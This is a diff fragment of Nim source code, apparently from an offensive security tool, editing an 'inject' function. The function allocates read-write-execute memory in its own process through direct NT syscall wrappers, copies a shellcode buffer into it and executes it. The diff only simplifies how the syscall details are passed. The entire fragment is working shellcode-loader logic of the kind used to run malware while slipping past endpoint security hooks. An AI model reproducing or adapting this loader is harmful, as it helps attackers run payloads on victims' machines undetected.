@@ -68,10 +68,10 @@ proc inject(): NtResult[bool] = # you need to wrap the result in some sort of Nt
     var dest: LPVOID
     var current_process: HANDLE = cast[HANDLE](-1) # pseudo handle to current proc
 
-    var ret = NtAllocateVirtualMemoryWrapper(current_process, &dest, 0, &sc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE, NtAllocateVirtualMemorySyscall.wSyscall, NtAllocateVirtualMemorySyscall.pSyscall, NtAllocateVirtualMemorySyscall.pFunction)
+    var ret = NtAllocateVirtualMemoryWrapper(current_process, &dest, 0, &sc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE, NtAllocateVirtualMemorySyscall)
     
     var bytesWritten: SIZE_T
-    ret = NtWriteVirtualMemoryWrapper(current_process, dest, unsafeAddr buf, sc_size-1, addr bytesWritten, NtWriteVirtualMemorySyscall.wSyscall, NtWriteVirtualMemorySyscall.pSyscall, NtWriteVirtualMemorySyscall.pFunction)
+    ret = NtWriteVirtualMemoryWrapper(current_process, dest, unsafeAddr buf, sc_size-1, addr bytesWritten, NtWriteVirtualMemorySyscall)
     
     let f = cast[proc(){.nimcall.}](dest)
     f()
